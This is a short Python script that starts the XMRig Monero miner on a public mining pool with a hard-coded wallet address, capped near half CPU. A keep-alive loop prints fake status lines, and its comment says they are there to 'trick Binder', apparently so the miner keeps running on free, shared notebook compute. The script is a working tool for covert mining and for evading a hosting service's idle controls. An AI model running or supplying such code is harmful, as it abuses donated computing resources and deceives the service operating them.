import os
import subprocess
import time

# Start XMRig at 49% usage on 1 core
# Replace YOUR_WALLET with your address
cmd = "./xmrig-6.21.0/xmrig -o mini.p2pool.observer:3333 -u 89T9kvjYMeqBY8yky4mbP8EDP1rouQDjJgGkRZ22uFXz9phDhtMSYKz8Skq8B7d8LfVitghrx4juyTXrUeDwsUHwCut2EYM -p binder_farm --cpu-max-threads-hint 50 --cpu-priority 1 --donate-level 1"

print("Starting Worker...")
subprocess.Popen(cmd, shell=True)

# The Keep-Alive Loop: Prints to console every 30s to trick Binder
while True:
    print(f"Status: Active | Load: 49% | Time: {time.ctime()}")
    time.sleep(30)
